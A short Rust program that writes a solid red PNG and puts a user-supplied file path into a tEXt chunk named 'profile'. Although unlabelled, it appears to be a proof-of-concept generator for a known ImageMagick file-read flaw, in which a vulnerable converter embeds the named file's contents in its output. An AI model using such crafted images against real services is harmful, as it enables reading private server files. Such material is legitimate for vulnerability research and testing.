use std::path::Path;
use std::fs::File;
use std::io::BufWriter;

fn multiply_bytes(buf_in: &[u8], mul: usize) -> Vec<u8> {
    std::iter::repeat(buf_in)
        .take(mul)
        .flatten()
        .cloned()
        .collect::<Vec<u8>>()
}

fn main() {
    let filepath = std::env::args().nth(1).expect("no path given");
    let path = Path::new(r"./image.png");
    let file = File::create(path).unwrap();
    let ref mut w = BufWriter::new(file);
    let mut encoder = png::Encoder::new(w, 200, 200);
    encoder.set_color(png::ColorType::Rgba);
    encoder.set_depth(png::BitDepth::Eight);
    // Adding text chunks to the header
    encoder.add_text_chunk(
        "profile".to_string(),
        filepath.to_string(),
    )
    .unwrap();
    let mut writer = encoder.write_header().unwrap();

    writer.write_image_data(&multiply_bytes(&[255, 0, 0, 255], 40000)).unwrap(); // Save
    
}

